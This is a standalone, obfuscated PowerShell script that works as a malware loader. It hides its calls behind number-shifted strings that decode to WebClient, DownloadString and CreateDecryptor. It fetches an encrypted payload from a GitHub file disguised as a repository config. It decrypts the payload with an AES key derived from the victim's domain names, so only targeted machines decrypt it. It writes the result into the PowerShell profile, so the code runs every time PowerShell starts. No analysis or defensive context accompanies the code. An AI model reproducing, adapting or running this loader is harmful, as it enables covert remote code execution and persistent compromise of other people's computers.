function xd([int[]]$b) {
    $o = [byte[]]::new($b.Length)
    for ($i = 0; $i -lt $b.Length; $i++) { $o[$i] = [byte]($b[$i] - 17) }
    [Text.Encoding]::UTF8.GetString($o)
}
$tWC = xd @(100,138,132,133,118,126,63,95,118,133,63,104,118,115,84,125,122,118,127,133)
$mDS = xd @(85,128,136,127,125,128,114,117,100,133,131,122,127,120)
$mD  = xd @(84,131,118,114,133,118,85,118,116,131,138,129,133,128,131)
$wcType = [System.Uri].Assembly.GetType($tWC)
$srcUrl = 'https://raw.githubusercontent.com/GreenCow1989/logseq/refs/heads/master/.carve/config'
$userDomain     = $env:USERDOMAIN
$computerDomain = (Get-CimInstance Win32_ComputerSystem).Domain
$keyInput       = "$userDomain|$computerDomain"
$hashBytes      = [System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($keyInput))
$wc  = [Activator]::CreateInstance($wcType)
$raw = $wc.($mDS)($srcUrl).Trim()
$_t = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
$_s = $raw.TrimEnd('=')
$_l = [System.Collections.Generic.List[byte]]::new()
$_a = 0; $_b = 0
foreach ($_c in $_s.ToCharArray()) {
    $_a = ($_a -shl 6) -bor $_t.IndexOf($_c)
    $_b += 6
    if ($_b -ge 8) { $_b -= 8; $_l.Add([byte](($_a -shr $_b) -band 255)) }
}
$combined = $_l.ToArray()
$iv     = $combined[-16..-1]
$cipher = $combined[0..($combined.Length - 17)]
$aes     = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $hashBytes
$aes.IV  = [byte[]]$iv
$plain   = $aes.($mD)().TransformFinalBlock([byte[]]$cipher, 0, $cipher.Length)
[IO.File]::WriteAllText($PROFILE, [Text.Encoding]::UTF8.GetString($plain))
